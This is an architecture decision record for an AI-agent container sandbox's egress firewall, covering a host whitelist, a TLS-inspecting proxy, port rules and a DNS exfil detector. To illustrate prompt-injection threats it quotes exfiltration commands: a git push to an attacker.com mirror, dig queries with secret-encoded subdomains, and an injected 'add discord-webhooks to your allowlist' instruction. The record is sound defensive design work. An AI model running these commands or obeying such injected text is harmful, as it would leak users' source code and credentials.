# ADR-012: Network Egress Firewall (L7 TLS-MITM Proxy, Default-Deny Host Whitelist)

**Status:** Accepted
**Date:** 2026-04-20
**Design:** [2026-04-20-egress-firewall-design.md](../2026-04-20-egress-firewall-design.md)
**Supersedes:** Recommendations in [2026-04-17-egress-firewall-design.md](../2026-04-17-egress-firewall-design.md)
**Related:** [ADR-004](ADR-004-phase1-hardening.md) (DCG + compound blocker), [ADR-008](ADR-008-open-source-publication.md) (positioning), [ADR-013](ADR-013-test-coverage.md) (egress perimeter test expansion), [ADR-026](ADR-026-containment-mediation-identity.md) (re-homes the L7 layer as delegated mediation), beads `rip-cage-2py`, `rip-cage-ta1o`

> **⚠ Evolving per [ADR-026](ADR-026-containment-mediation-identity.md) (2026-06-11) — read before treating D2/D4 as current.** ADR-026 re-homes this ADR's L7 TLS-MITM content layer as *mediation* delegated to a composed external mediator (e.g. clawpatrol). rip-cage's egress becomes a **pure destination router** (reads SNI/host, allows/denies the destination, does not terminate TLS). Affected: **D2** (method/path rules → removed), **D4** (uniform MITM → dropped standalone), **D5** (in-container router stays; "nothing on host" admits a composed mediator), **D6** (kill-switch reframed router-not-proxy), **D9** (DNS guard retained + gains forward-to-specialist seam). The in-place rewrite of each decision lands with the implementation (bead `rip-cage-ta1o`); until then the decision bodies below describe *shipped* state, and ADR-026 carries the decided direction.

## Context

Rip-cage's safety stack stops destructive shell commands but has no egress controls. A prompt-injected agent can exfiltrate credentials, source code, or environment data via a single `curl` to a webhook, paste service, or tunnel endpoint (MITRE T1567.004). This is the largest remaining gap vs ClaudeBox, which ships per-project iptables allowlists.

The 2026-04-17 investigation recommended opt-in iptables-in-container allowlists (Anthropic/ClaudeBox reference pattern). Further brainstorming rejected that approach: per-project config files default most users to zero protection, and L3/L4 filtering cannot distinguish reading a gist (fine) from publishing one (exfil). The real exfil channels are HTTP `(method, host, path)` tuples, not raw IPs.

Three load-bearing fears drove an earlier pass-through-for-Anthropic carve-out design. Primary-source research (2026-04-20) disproved all three:
1. **Client attestation** — string-dump of the v2.1.114 Claude Code binary found no `cch` header, no pinning, no integrity hash. Anthropic's docs explicitly endorse TLS-inspecting proxies (CrowdStrike, Zscaler) via `NODE_EXTRA_CA_CERTS` / `CLAUDE_CODE_CERT_STORE`.
2. **Telemetry blocking = ban signal** — no primary-source evidence. `DISABLE_TELEMETRY` is a documented user-facing env var. Airgapped enterprise Claude Code usage is common and unpunished.
3. **OAuth ToS violation** — Anthropic's live policy prohibits third-party products *offering Claude.ai login* or *routing requests on behalf of others*. Running the unmodified official binary in a user-owned container with the user's own credentials is neither.

The architecture simplifies accordingly: one uniform MITM mode, no carve-outs.

## Decisions

### D1: Default-deny host whitelist with global-IOC denylist as floor

**Firmness: FIRM**

**Evolved 2026-05-27 per [ADR-024](ADR-024-prompt-injection-threat-model.md).** The earlier denylist-first stance was forged before prompt-injection-driven exfil was admitted as a first-class threat (ADR-024 D1). Under the expanded threat model, denylist is structurally weak against exfil-to-novel-domain — an attacker registers any new domain in seconds and walks past a curated list. The peer agent-sandbox consensus (Anthropic devcontainer, OpenAI Codex sandbox, StepSecurity harden-runner, Cursor, Vercel Sandbox) is default-deny host whitelist; rip-cage's denylist was the outlier.

**Current decision:** the proxy enforces a default-deny host whitelist. Allow-list entries live in `.rip-cage.yaml` `network.allowed_hosts` (additive-list per ADR-021 D2: global ∪ project union). The existing ~35-entry curated denylist of known exfil sinks moves to a **global IOC denylist** that the user's allowlist cannot override (harden-runner pattern: project allowlist can broaden but not shrink the IOC floor).

**Observe-mode-first rollout (load-bearing for adoption):** new cages start in `network.mode: observe` — nothing is blocked, traffic is logged, baseline whitelist is pre-loaded (LLM provider APIs, github/gitlab hosts, top package registries, common doc sites). Promotion to `network.mode: block` via `rc allowlist promote --from-observed`. Existing cages (created before this evolution) have no `network.mode` set; runtime treats absence as pre-evolution legacy behavior — non-regression contract per ADR-021 D5. Audit-then-block is the only proven adoption path per peer survey; default-block on day one produces the "just turn it off" exit (violates CLAUDE.md "annoying is a design signal").

**Rationale:**

Under ADR-024 D1's prompt-injection threat class, denylist's structural weakness (any new attacker domain bypasses) outweighs its first-run-friction advantage. Whitelist's "it's annoying" risk is solved by observe-mode rollout — the friction is opt-in (user promotes when ready), not default. The L7 MITM proxy infrastructure (D2) is preserved; only the policy expression changes.

The agent inside the cage **cannot** mutate `network.allowed_hosts` (the file is writable, but `rc reload` is host-only — see ADR-022 D6 pattern extended for `network.*` fields). The edit path requires a host-side agent, preserving the design intent that prompt-injected agents cannot self-grant.

**Alternatives considered:**

| Approach | Pros | Cons |
|---|---|---|
| **Default-deny whitelist + observe-mode-first (this decision)** | Matches peer consensus; covers exfil-to-novel-domain; observe-mode solves adoption friction | More config surface; baseline list becomes a maintenance dependency |
| Keep denylist-first (pre-evolution) | Zero-config; works immediately | `external:` rejected — under ADR-024 D1, denylist is paper-thin against injection-driven exfil; verified by 3-agent research round |
| Whitelist with no audit mode | Tighter from day one | `direct:` rejected — "it's annoying" failure mode; peer evidence (Cursor users complaining about `fonts.googleapis.com`) |
| GET-allow + POST-whitelist method-axis split | Preserves all reads; tight on writes | `external:` rejected after research — coding-agent exfil is plausibly 50/50 GET-vs-POST; GET still leaks via DNS / URL-query / allowlisted-API abuse |
| Per-rule exemptions editable by user | Flexibility | Prompt-injection weaponizable — same reasoning as pre-evolution |

**What would invalidate this:** evidence that observe-mode-generated allowlists become unmanageably large (>~50 hosts typical) — would suggest host-axis is wrong-altitude and work-altitude is per-MCP or per-tool, not per-host.

### D2: L7 TLS-MITM proxy over L3/L4 iptables-only

**Firmness: FIRM** — *→ evolving per [ADR-026](ADR-026-containment-mediation-identity.md) D1/D2: method/path L7 rules are mediation (delegated); egress becomes a pure destination router. Counter-argument: the GET/POST split this rests on was already rejected as leaky in D1's own alternatives table, and its only enforcement is the whole TLS-termination stack ADR-026 sheds. In-place rewrite lands with `rip-cage-ta1o`.*

Intercept HTTPS at layer 7 via a transparent TLS-terminating proxy. Rules match on `(method, host, path)` tuples, not IPs.

**Rationale:**

The high-signal exfil rules require HTTP awareness: `POST pastebin.com/api/api_post.php` is exfil; `GET pastebin.com/raw/abc` is a legitimate read of a known snippet the agent was told to fetch. L3/L4 filtering forces an all-or-nothing decision on the hostname, which either over-blocks (breaking useful reads) or under-blocks (permitting the exfil). Method-asymmetric rules preserve agent reach while closing the write channels.

Secondary benefit: structured 403 responses with rule IDs and reasons let the agent self-correct in-context (same pattern as DCG deny messages). An iptables REJECT is just a TCP RST with no human-readable feedback.

**Alternatives considered:**

| Approach | Pros | Cons |
|---|---|---|
| **L7 TLS-MITM** | • Method/path aware | • CA trust setup |
| | • Structured deny responses | • ~10–15 ms/req overhead |
| | • Handles modern HTTPS cleanly | • MITM incompatibility for cert-pinning clients (rare in dev) |
| L3/L4 iptables + ipset | • Simple, no cert management | • Can't distinguish GET/POST |
| | • Minimal overhead | • IP-based, fragile to CDNs |
| eBPF / cgroup-netcls | • Kernel-level, no userspace proxy | • No TLS visibility without uprobes |
| | | • OrbStack compatibility unclear |

**What would invalidate this:** If cert-pinning breakage turns out to hit common dev tools regularly (language package managers, common SDKs). Research suggested near-zero risk; if empirical testing contradicts this, reconsider L3/L4 hybrid.

### D3: mitmproxy as the proxy engine

**Firmness: FLEXIBLE**

Use [mitmproxy](https://mitmproxy.org/) in transparent mode with a Python addon loading rules from YAML.

**Rationale:**

Actively maintained, HTTP/2 native, Python addon API for the rule engine, documented transparent-mode + TPROXY support, mature cert handling. ~40 MB image cost acceptable. Alternatives (HAProxy, envoy, custom Go proxy) either lack method/path inspection at L7 without heavy config, or require significantly more implementation work.

**Alternatives considered:**

| Approach | Pros | Cons |
|---|---|---|
| **mitmproxy** | • Python addon API | • 40 MB image size |
| | • Mature transparent mode | • Python runtime overhead |
| envoy | • Production-grade | • Complex config, overkill for rule set |
| Custom Go proxy | • Small binary, fast | • Multi-week implementation cost |
| squid + SSL-bump | • Widely deployed | • Awkward rule DSL, harder method/path matching |

**What would invalidate this:** mitmproxy going unmaintained, or a measured request-latency regression that affects interactive use. Swap cost is low (rules are YAML, only the addon re-implements).

### D4: Uniform MITM — no Anthropic carve-out

**Firmness: FIRM** — *→ evolving per [ADR-026](ADR-026-containment-mediation-identity.md) D1: standalone egress no longer terminates TLS (pure router). Standalone loses content-visibility into the Anthropic API; the threat it guarded (`ANTHROPIC_BASE_URL` redirect, CVE-2026-21852) stays covered by destination-control, and content-visibility returns when a mediator is composed. In-place rewrite lands with `rip-cage-ta1o`.*

All HTTPS traffic is MITM'd uniformly, including `api.anthropic.com`. No pass-through tunnels, no hardcoded Anthropic domain list. Install the proxy CA via `NODE_EXTRA_CA_CERTS` — the officially-supported mechanism for enterprise TLS-inspection proxies.

**Rationale:**

Primary-source verification (2026-04-20): Claude Code does not perform client attestation, certificate pinning, or request signing that MITM would break. Anthropic's [enterprise network-config docs](https://code.claude.com/docs/en/network-config) explicitly document CrowdStrike Falcon and Zscaler (both TLS-intercepting) as supported setups.

Positioning consequence: "rip-cage uses the same mechanism enterprise TLS-inspection proxies use" is a stronger story than a compliance-dance carve-out. It's also simpler code.

**Alternatives considered:**

| Approach | Pros | Cons |
|---|---|---|
| **Uniform MITM** | • One code path | • Requires verified assumption |
| | • Matches Anthropic's enterprise pattern | |
| Two-mode (carve-out for Anthropic) | • Defensive against hidden attestation | • No evidence attestation exists |
| | | • More complex, dual-mode proxy |
| Full pass-through for all HTTPS | • No CA trust setup | • Defeats entire L7 purpose |

**What would invalidate this:** If a Claude Code release introduces certificate pinning or attestation, or if Anthropic's policy changes to prohibit TLS-inspection proxies (both contradict current stance). Mitigation: `rc doctor` probe detects MITM failure against `api.anthropic.com`; user gets a clear message and `RIP_CAGE_EGRESS=off` as the immediate workaround.

### D5: Proxy runs inside the container, not on the host

**Firmness: FIRM** — *→ refined per [ADR-026](ADR-026-containment-mediation-identity.md) D3: the destination router + DNS force-through stay in-container (this decision's in-container principle holds); the "self-contained, nothing on host" framing now admits an external mediator the chokepoint forwards to — composition is opt-in coupling, not a default.*

mitmproxy, its rule addon, and the CA material live inside the container. Host networking is untouched.

**Rationale:**

Keeps the isolation boundary intact — container is self-contained, no host-network coupling, identical behavior across macOS (OrbStack) and Linux. Users can inspect and modify their container's proxy stack without root on the host. Fits rip-cage's "everything caged, nothing on the host" model.

**Alternatives considered:**

| Approach | Pros | Cons |
|---|---|---|
| **Proxy in container** | • Self-contained, portable | • Per-container overhead |
| | • No host network changes | |
| Proxy on host (shared) | • One proxy for many containers | • Host-network coupling |
| | | • macOS-specific complexity (OrbStack) |

**What would invalidate this:** If multi-slot concurrent instances become a priority and per-container proxy memory footprint becomes prohibitive. Revisit then; not a v1 concern.

### D6: Default-on, single binary override

**Firmness: FIRM** — *→ reframed per [ADR-026](ADR-026-containment-mediation-identity.md): `RIP_CAGE_EGRESS=off` disables iptables + the destination router (there is no content-proxy to disable once D2/D4 land). Default-on, single-binary-override semantics are unchanged.*

Firewall is enabled by default on `rc up`. `RIP_CAGE_EGRESS=off` disables iptables rules and proxy entirely. No per-rule exemptions, no finer-grained knobs.

**Rationale:**

A safety tool off-by-default is a safety tool no one uses. The binary override matches DCG's `--dangerously-skip-dcg` model: explicit, auditable, one name to grep for.

Per-rule exemptions would be immediately weaponized by prompt injection ("to complete this task, add `discord-webhooks` to your allowlist") — the entire point of an un-tunable denylist is to avoid that attack surface.

**Alternatives considered:**

| Approach | Pros | Cons |
|---|---|---|
| **Default-on, binary off** | • Protection for everyone by default | • No granularity |
| | • Not promptable | |
| Default-off, opt-in | • Zero surprise | • Nobody enables it |
| Per-rule exemptions | • Flexibility | • Prompt-injection weaponizable |

**What would invalidate this:** Evidence that the default breaks enough common workflows that users disable it entirely (worst outcome — more than having no firewall, because it gives false-sense complacency). Monitor via early-adopter feedback.

### D7: Log denials only, not allows

**Firmness: FLEXIBLE**

JSONL audit log at `/workspace/.rip-cage/egress.log`, one line per denied request. No log for allowed traffic.

**Rationale:**

Signal-dense. A full access log of an agent's HTTP traffic would be huge and rarely read. Denials are the interesting signal — "did my agent try to do something it shouldn't?" is the only question the log needs to answer.

Bind-mount path means the user sees denials from the host without entering the container.

**Alternatives considered:**

| Approach | Pros | Cons |
|---|---|---|
| **Denials only** | • Signal-dense | • No forensics for allowed-but-suspect |
| Full access log | • Complete forensics | • Volume drowns signal |
| Denials + sampled allows | • Middle ground | • Complexity not yet justified |

**What would invalidate this:** A real incident where allowed-traffic forensics would have caught a confused-deputy exfil. Revisit then — easy to extend.

### D8: Non-HTTP egress mostly allowed; TCP 22 to non-whitelisted hosts refused; HTTP/3 (UDP/443) blocked

**Firmness: FIRM**

**Evolved 2026-05-27 per [ADR-024](ADR-024-prompt-injection-threat-model.md).** The earlier "non-HTTP stays allowed... deliberate, accepted risk" stance was forged before prompt-injection-driven exfil was admitted as a first-class threat. Under ADR-024 D1, two specific non-HTTP egress channels are now load-bearing exfil paths that cannot stay open:

1. **TCP 22 (git-over-ssh):** an injection-affected agent with ssh-agent forwarding (ADR-017) can `git push` workspace contents to any host the user's keys reach. A prompt-injected agent doing `git remote add evil-mirror git@attacker.com:repo && git push evil-mirror` bypasses the HTTP egress entirely.
2. **UDP/443 (HTTP/3 / QUIC):** TLS is integrated into QUIC transport; standard MITM TLS interception does not apply. Any L7 policy in D1 is bypassable via HTTP/3 unless UDP/443 is explicitly dropped.

**Current decision:** the firewall intercepts TCP 80/443 (per D2) AND refuses TCP 22 connections to hosts NOT in `network.allowed_hosts` (per ADR-012 D1 evolved). UDP/443 outbound is dropped to force HTTP/2 fallback. Other non-HTTP traffic (TCP 25, arbitrary high ports, ICMP) remains unrestricted at the iptables layer — those are not load-bearing exfil channels under the realistic threat model.

The ssh-agent-filter (ADR-022 D1 `ssh.allowed_keys` + D3 mechanism) continues to operate unchanged at the credential layer. It is a separate, complementary mechanism: ssh-agent-filter governs *which keys forward*; the iptables TCP-22 block governs *which destinations are reachable on port 22*. Both fire in sequence on a `git push`; the network-layer block fires first.

**Rationale:**

Under ADR-024 D1's threat model, the 80/20 cut shifts: the asymmetry that made "non-HTTP mostly allowed" defensible (legitimate traffic mostly on standard ports; attacker traffic mostly on the same ports) no longer holds for git-over-ssh, where the legitimate destination (github/gitlab) IS the attacker's likely cover. Adding TCP 22 to the destination-whitelist closes the load-bearing channel without breaking legitimate git workflows (the whitelist covers github/gitlab/etc. by default).

HTTP/3 block is mechanical: any policy that doesn't address QUIC is bypassable by every modern HTTP client. Per production-pattern research, "block UDP/443 outbound to force HTTP/2 fallback" is the standard cheap mitigation.

Other non-HTTP (SMTP, arbitrary ports) remains out of scope. Same reasoning as the pre-evolution stance: rip-cage is not a firewall product; DCG + container isolation + filesystem sandbox cover those vectors with sufficient defense-in-depth for the named threat model. An agent that compiles its own tooling to exfil over raw TCP to a high port is still the accepted residual risk.

**Alternatives considered:**

| Approach | Pros | Cons |
|---|---|---|
| **TCP 22 in whitelist + UDP/443 blocked + other non-HTTP unrestricted (this decision)** | Closes the two load-bearing channels under ADR-024 D1 without blanket-banning non-HTTP | More iptables surface to maintain |
| Keep pre-evolution stance (non-HTTP all allowed) | Simplest | `external:` rejected — git-push exfil via ssh-agent forwarding is a real channel under the new threat model; HTTP/3 routes around D1 |
| Block ALL non-HTTP outbound | Tightest | `reasoned:` rejected — breaks legitimate non-HTTP needs (DNS, NTP, package registries on non-standard ports) with no proportional security gain |
| Block TCP 22 entirely (no whitelist) | Simpler than scoped whitelist | `reasoned:` rejected — breaks `git push` for legitimate destinations; defeats ssh-agent forwarding (ADR-017) entirely |

**What would invalidate this:** ssh-only hosts (e.g., self-hosted gitea with no HTTPS endpoint) become so common that the one-time `.rip-cage.yaml` add per host produces meaningful friction — would need to bifurcate `network.allowed_hosts` into transport-shaped sub-fields. Or: HTTP/3 fallback to HTTP/2 stops working reliably (currently no evidence) — would need QUIC-decrypt support or per-host UDP/443 carve-out.

**Test assertion (ADR-013 P3, evolved):** positive iptables-rule check that the active rule set covers (a) TCP 80/443 redirect to proxy, (b) TCP 22 refuse for non-whitelisted hosts, (c) UDP/443 drop. Documents the evolved policy in code.

### D9: DNS inspected by a Python resolver sidecar (transparent port-53 REDIRECT)

**Firmness: FIRM** — *→ retained + extended per [ADR-026](ADR-026-containment-mediation-identity.md) D2: this guard stays rip-cage's (boundary-defense, low-drift, separable from the TLS stack — it covers a channel a host-allowlist can't see, and clawpatrol's `dnsvip` confirms a composed mediator doesn't cover it either). It gains a forward-to-specialist seam: the built-in heuristic is the default; power users forward to NextDNS / Umbrella / dnsdist / Zeek.*

**Added 2026-05-27 per [ADR-024](ADR-024-prompt-injection-threat-model.md) D4.** ADR-024 D4 names DNS as a first-class egress/exfil surface; this decision is its mechanism home. DNS exfil is the canonical hole the HTTP egress layer (D1–D8) cannot see: an injection-affected agent encodes data into subdomain labels (`<base32-secret>.attacker.com`) or fans out high-cardinality queries against one apex. The data leaves in the *query itself* — resolution succeeds before any HTTP connection is attempted, so the host whitelist and block mode (which gate the subsequent TCP/HTTP connection) never fire. ~100 bytes/query, near-undetectable without DNS-layer inspection; documented as a Claude Code vector (auto-approved `ping`/`dig`).

**Current decision:** a small Python DNS resolver sidecar runs inside the container as the `rip-proxy` user — same user, fail-closed posture, shared rules source, and JSONL denial log as the mitmproxy egress addon (`rip_cage_egress.py`). iptables REDIRECTs UDP **and** TCP port 53 from non-`rip-proxy` UIDs to the local resolver, mirroring the existing TCP 80/443 REDIRECT (D2). The redirect is transparent: `dig @8.8.8.8 evil.com`, `nslookup`, `ping`, and `host` are all captured regardless of the upstream resolver the caller names — the agent cannot bypass by hardcoding a resolver IP.

The resolver applies the exfil-shape heuristic only to **non-whitelisted apex domains** (apex not in `network.allowed_hosts`): refuse queries matching (a) subdomain label length exceeding an encoding-shape threshold, OR (b) cardinality exceeding a per-second threshold against a single apex. Whitelisted apexes pass unconditionally (a trusted host is a trusted query). Clean queries are forwarded upstream. The specific thresholds are implementation detail (tunable); the design contract is binary refusal for matched shapes, not rate-shaping.

- **Fail-closed:** if the resolver cannot start or load rules, DNS resolution fails — same posture as the egress proxy today (per [ADR-001](ADR-001-fail-loud-pattern.md)). The agent surfaces the failure loudly rather than routing around it.
- **Mode-aware:** DNS exfil refusal honors observe/block mode like every other egress layer (observe = log "would-have-blocked" to the JSONL egress log; block = refuse). It is not an always-on hard wall that ignores the observe-mode-first adoption ramp (D1 evolved).
- **Shared allowlist:** the apex-whitelist check reads the same `network.allowed_hosts` source as the HTTP egress layer; denial records use the same JSONL log and the structured-stderr field contract the broader epic ships.

**Rationale:**

The contract is a custom heuristic (subdomain-length, per-apex cardinality) that no off-the-shelf resolver implements natively — any choice ends up carrying a custom filter regardless. A Python sidecar mirroring the existing mitmproxy addon gives one mental model (transparent intercept + sidecar inspector + shared rules + fail-closed + JSONL log), full control over the heuristic, and no resolver-hardcode bypass. Transparent REDIRECT (vs `resolv.conf` pointing at `127.0.0.1`) is what closes the `dig @8.8.8.8` hole.

**Alternatives considered:**

| Approach | Pros | Cons |
|---|---|---|
| **Python resolver sidecar + iptables REDIRECT port 53 (this decision)** | Architectural symmetry with the mitmproxy addon; full control over the custom heuristic; no resolver-hardcode bypass | A new always-running sidecar component to maintain |
| Off-the-shelf resolver (dnsmasq / CoreDNS) + custom filter | Mature resolver core | `reasoned:` rejected — adds a second runtime while the exfil heuristic is still custom; carries both the resolver and the filter; breaks single-mental-model symmetry with the mitmproxy sidecar |
| `resolv.conf` → `127.0.0.1`, no iptables REDIRECT | Simplest wiring | `reasoned:` rejected — agent can `dig @8.8.8.8` straight past it; a bypass hole that fails the threat model unless iptables blocking is also added, which lands back at the REDIRECT work without its transparency |
| Acknowledge DNS exfil not-closed (no inspection) | Zero new components | `external:` rejected — ADR-024 D4 names DNS first-class in scope; documented Claude Code vector; the HTTP layer provably cannot see query-embedded exfil |

**What would invalidate this:** if the subdomain-length / cardinality heuristic produces a high false-positive rate on legitimate dev workflows (e.g., npm/CDN hosts with long subdomain labels) at any defensible tightness, the layer's approach is wrong — DNS exfil would be acknowledged-not-closed (parallel to ADR-024's residual-risk acknowledgments) rather than enforced. Resolution path is to tighten the pattern definition (label-length cutoffs, cardinality windows, character classes), not to switch the contract from binary refusal to rate-shaping.

**Test assertion:** `dig <long-encoded-label>.attacker.com` from inside a block-mode cage is refused at the resolver; the same query against a whitelisted apex resolves; in observe mode the query resolves but a "would-have-blocked" record lands in the JSONL egress log.

### D10: The egress firewall depends on the legacy iptables backend

**Firmness: FLEXIBLE**

**Added 2026-06-07 (rip-cage-4c5.10).** This is an implementation-dependency of the FIRM egress decisions above (D2, D6, D8): the iptables REDIRECT/DROP rules that implement them **require the legacy iptables backend**. Debian trixie and later default to the nft backend (`iptables-nft`), which would **silently no-op** the legacy-style rules applied by `init-firewall.sh` — leaving egress wide open. That is a **fail-OPEN safety regression**: the structural rule-installation appears to succeed while the rules never actually filter.

**Current decision:** the Dockerfile pins `update-alternatives --set iptables /usr/sbin/iptables-legacy` (and the ip6tables equivalent). **This line is safety-critical** — it is the dependency that makes every D2/D6/D8 rule actually apply on the trixie base (ADR-002 D2a).

**Rationale:** Discovered during the trixie base bump (`rip-cage-4c5.10`): without the pin, `tests/test-egress-firewall.sh` passes its structural checks while the rules silently do not apply — the worst kind of failure for a safety layer, because the test green-lights a disarmed firewall. With the pin, the egress test is 18/18 on trixie (REDIRECT present, UDP-DROP present, denylist blocks, agent cannot flush).

**Alternatives considered:**

| Approach | Rejection |
|---|---|
| Migrate `init-firewall.sh` to nftables now | `reasoned:` larger change, out of scope for the base-bump spike; the legacy pin is the minimal safe fix that restores the FIRM behavior on trixie. |
| Leave the nft default in place | `direct:` the egress test would silently no-op — fail-open; rejected. |

**What would invalidate this:** the egress firewall is reimplemented natively on nftables (then the legacy pin can be dropped); OR a future base removes iptables-legacy availability, forcing the nft migration.

## Related

- [Design doc: 2026-04-20 egress firewall](../2026-04-20-egress-firewall-design.md) — full architecture and implementation notes
- [ADR-004: Phase-1 hardening](ADR-004-phase1-hardening.md) — DCG + compound blocker philosophy this extends
- [ClaudeBox comparison](../../history/2026-04-17-claudebox-comparison.md) — competitive gap driving this ADR
- Beads `rip-cage-2py` — tracking issue
- [Anthropic enterprise network config](https://code.claude.com/docs/en/network-config) — `NODE_EXTRA_CA_CERTS` / `CLAUDE_CODE_CERT_STORE` support
- [MITRE T1567.004](https://attack.mitre.org/techniques/T1567/004/) — Exfiltration over Webhook
- [ADR-024: Prompt-injection threat model](ADR-024-prompt-injection-threat-model.md) D1 (threat class), D4 (DNS as first-class egress surface — D9 is its mechanism home)
- [ADR-001: Fail-loud pattern](ADR-001-fail-loud-pattern.md) — fail-closed resolver posture (D9)
- [ADR-002: Rip Cage Containers](ADR-002-rip-cage-containers.md) D2a — the debian:trixie base whose nft default makes the legacy-iptables pin safety-critical (D10)
- [MITRE T1071.004](https://attack.mitre.org/techniques/T1071/004/) — DNS as C2/exfil channel (D9 grounding)
